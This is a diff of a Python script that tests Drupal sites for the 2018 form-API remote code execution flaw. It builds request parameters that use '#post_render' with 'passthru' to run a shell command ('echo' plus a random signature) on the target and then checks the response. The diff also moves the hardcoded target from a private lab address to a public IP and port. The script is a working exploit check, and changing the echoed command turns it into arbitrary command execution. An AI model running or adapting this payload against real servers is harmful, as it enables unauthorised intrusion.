@@ -1,30 +1,19 @@
 import requests
 import re
-import string
-import random
-
-def genSignature(size=6, chars=string.ascii_uppercase + string.digits):
-	return ''.join(random.choice(chars) for _ in range(size))
+import bb01_ultilities as ulti
 
 def isFormValid(host,version):
 	form_id = 'user/password'  if version[:1]=='7' else 'user/register'
-	# check form with ?q
-	url = host + '?q=' +form_id
-	# print url
-	r = requests.get(url)
-	if (r.status_code == 200):
-		return True
-	# check form without ?q
-	url = host +form_id
-	# print url
-	r = requests.get(url)
-	if (r.status_code == 200):
+	urlq = host + '?q=' +form_id
+	url  = host +form_id
+
+	if (ulti.isURLValid(urlq) or ulti.isURLValid(url)):
 		return True
 
 	return False
 
-def isPwnAble_2018(host,version):
-	signature = genSignature()
+def isPwnAble(host,version):
+	signature = ulti.genSignature()
 	version = version[:1]
 	if version == '7':
 		get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#type]':'markup', 'name[#markup]': ' echo ' + signature}
@@ -52,23 +41,25 @@ def isPwnAble_2018(host,version):
 		else :	
 			return False
 
-
-def isVulnerable(host, version):
+def isVuln(host, version):
 	print 'Form Valid: ' , isFormValid(host,version)
 	if isFormValid(host,version) == False:
 		return False
 
-	if isPwnAble_2018(host,version) == False:
+	if isPwnAble(host,version) == False:
 		return False
 
 	return True
 
 
-host = 'http://192.168.210.131'
-version ='8.2'
+host = 'http://68.183.237.96:2307'
+version ='7.44'
 print 'Testing: ', host
 print '=' * 25
-if isVulnerable(host,version):
-	print " This site is vulnerable"
-else:	
-	print " This site is invulnerable"
+try:
+	if isVuln(host,version):
+		print " This site is vulnerable"
+	else:	
+		print " This site is invulnerable"
+except:
+	pass
